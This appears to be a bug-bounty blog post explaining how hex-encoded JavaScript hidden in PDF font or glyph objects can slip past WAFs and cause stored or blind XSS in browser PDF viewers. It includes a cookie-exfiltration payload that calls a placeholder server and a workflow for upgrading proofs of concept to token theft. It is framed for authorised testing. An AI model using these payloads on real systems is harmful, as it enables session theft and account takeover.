# Bypassing WAFs with PDF-Based Stored XSS: A Field Guide for Bug Bounty Hunters

> **Author**: Saumadip Mandal
> **Published**: Mar 12, 2026

---

![Saumadip Mandal](https://miro.medium.com/v2/resize:fill:32:32/1*yPmucF3e3itGjQHx347Dgw.png)

9

Listen

Share

Web apps love PDFs. Resumes, invoices, reports, support tickets, ID proofs — if users can upload files, PDFs are almost always in scope. Developers treat them like inert blobs. WAFs scan them like harmless paperwork.

That assumption is… optimistic.

Over the last few years, multiple researchers have shown that PDF previews rendered in the browser — often via PDF.js or similar libraries — can become an unexpected XSS attack surface. If the renderer parses malicious objects in just the wrong way, you get JavaScript execution in a context nobody thought about.

This post breaks down one practical technique that’s been quietly working in the wild: embedding hex-encoded JavaScript inside a valid PDF to bypass upload filters and trigger Stored or Blind XSS.

## The Core Idea

Many platforms preview uploaded PDFs directly in the browser using:

- Mozilla PDF.js (Firefox default, Chrome extensions, and countless web apps)
- Embedded iframe viewers
- Custom PDF rendering pipelines

If the renderer has a parsing or font-handling bug, a malicious payload hidden in the PDF structure can execute JavaScript.

Instead of dropping obvious <script>alert(1)</script> garbage that every scanner catches, you:

- Take a normal JavaScript payload
Example:
alert(document.domain)
or
fetch('https://your-server.com/log?c=' + document.cookie)
- Encode the entire payload as ASCII hex
Example:
\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29
- Embed it into a minimal but valid PDF structure
The payload gets placed inside:

- A font object
- A glyph stream
- A malformed object reference
- Or a parsing edge case in the content stream

4. Upload the PDF to any feature that stores and previews documents
Typical targets:

- Profile attachments
- Support ticket uploads
- Resume portals
- Invoice systems
- File-sharing features

5. Wait for someone to open or preview it
If the renderer is vulnerable, your JavaScript executes in the viewer’s context.

Congratulations. You just turned a boring PDF upload into a Stored or Blind XSS vector.

## Why This Slips Past WAFs

Most file upload filters and WAFs look for:

- <script> tags
- Inline event handlers
- Obvious HTML or JS keywords
- Known payload signatures

A hex-encoded JavaScript payload buried inside a binary-ish PDF object looks like noise.

To a filter, it’s just bytes.
To a vulnerable PDF renderer, it’s executable logic.

This mismatch between security assumptions and parsing reality is what makes this technique durable.

## Stored XSS vs Blind XSS

This method works in two useful modes.

Stored XSS

- Your payload persists in the uploaded file.
- Anyone who previews the file triggers execution.
- Best for: Admin panel views , Internal support dashboards , Shared document portals

Blind XSS

- Instead of alert(), your payload exfiltrates data.
- Example behavior: Send cookies or tokens to your server, Log the victim’s URL, role, or IP, Fire a callback to confirm execution

This is perfect for:

- Helpdesk uploads
- Abuse report systems
- Moderation queues
- Anywhere staff quietly open files

## Real-World Signals from the Community

This technique isn’t theorycrafting. It sits in the overlap between documented vulnerabilities and practical bug bounty findings.

1. PDF.js Execution Bugs

In 2024, Mozilla patched CVE-2024–4367, a vulnerability that allowed arbitrary JavaScript execution in PDF.js via a font-handling code path. Researchers demonstrated that malformed font objects could escape the intended sandbox and run attacker-controlled JS.

This class of bugs is exactly what makes PDF-based XSS viable.

2. HackerOne Reports

Multiple private and public reports on HackerOne have flagged:

- Stored XSS via file upload previews
- PDF and SVG rendering quirks
- JavaScript execution through third-party viewers

Even when not labeled “PDF XSS,” many reports follow the same pattern: unsafe rendering of attacker-supplied document formats.

3. Independent Researcher Techniques

Hunters like Orwa Godfather and others in the bug bounty community have shared payload patterns that:

- Use hex-encoded JavaScript
- Avoid standard HTML tags
- Trigger execution during parsing or rendering
- Bypass basic content scanners

These payloads have been quietly reused and adapted across programs with surprising success.

## Impact and Severity: How Programs Usually Judge It

Not every PDF XSS lands the same bounty.

## Get Saumadip Mandal’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Here’s how triage teams usually see it.

Low Severity (P4–P5 or Informational)

- Self-XSS only
- Payload runs only for the uploader
- Viewer is sandboxed with no cookie or token access
- No real data exfiltration possible

Medium Severity (P3)

- Stored XSS affecting other users
- Payload runs in a shared document portal
- Session or token exposure possible
- Proof shows real-world exploitation

High Severity (P2, sometimes P1)

- Admin or support staff open the file
- Session hijack or account takeover demonstrated
- Internal tooling affected
- Chained with privilege escalation

One important detail: many programs reject pure alert() PoCs.

To get real impact:

- Log sensitive data
- Show account takeover
- Demonstrate internal access
- Prove cross-user exploitation

## Practical Hunting Workflow

Here’s a simple, repeatable workflow that actually works.

- Identify upload features
Look for anything that:

- Stores files
- Previews PDFs
- Uses in-browser viewers

2. Confirm rendering behavior
Check:

- Is PDF.js used?
- Is it embedded in an iframe?
- Any visible console errors?

3. Generate a malicious PDF

- Take a known payload
- Hex-encode it
- Embed it in a minimal PDF structure
- Keep file size small and clean

4. Upload and trigger

- Upload as a normal user
- Open it yourself first
- Then test if staff or other users can trigger it

5. Upgrade the PoC
Replace alert() with:

- Token exfiltration
- Redirects
- Role detection
- Callback beacons

6. Report responsibly

- Include the PDF fil
- Show reproduction steps
- Demonstrate real impact
- Reference known classes of bugs like CVE-2024–4367

## Tools and Starting Points

If you want to experiment safely:

- Orwa Godfather’s payload repo
https://github.com/orwagodfather/XSS-Payloads
- Notepad++
Useful for: Hex view, Find/replace, Byte-level edits
- A local test environment
Always validate your payloads locally before uploading to live programs.

## Ethics, Sanity, and Staying Employed

This technique is powerful, but it’s not a toy.

- Only test on programs that explicitly allow file upload testing.
- Avoid payloads that cause irreversible damage.
- Never target real users outside a bug bounty scope.
- Keep your PoCs minimal and respectful.

Bug bounty isn’t about breaking things for fun. It’s about breaking them cleanly, proving impact, and helping platforms fix blind spots they didn’t know they had.

## Final Thoughts

PDFs aren’t dead files. They’re complex document programs hiding behind a friendly icon.

Every time a platform previews untrusted PDFs in the browser, it’s inviting a miniature interpreter into its security perimeter. Sometimes that interpreter forgets its manners.

That’s your opening.

Test responsibly. Document carefully. Report cleanly. And keep hunting the weird edges of the web — because that’s where the real bugs live.

Happy hunting.



---
*Original URL: [https://medium.com/@brutsecurity/bypassing-wafs-with-pdf-based-stored-xss-a-field-guide-for-bug-bounty-hunters-8bf1f2e2691e?source=search_post---------35-----------------------------------](https://medium.com/@brutsecurity/bypassing-wafs-with-pdf-based-stored-xss-a-field-guide-for-bug-bounty-hunters-8bf1f2e2691e?source=search_post---------35-----------------------------------)*
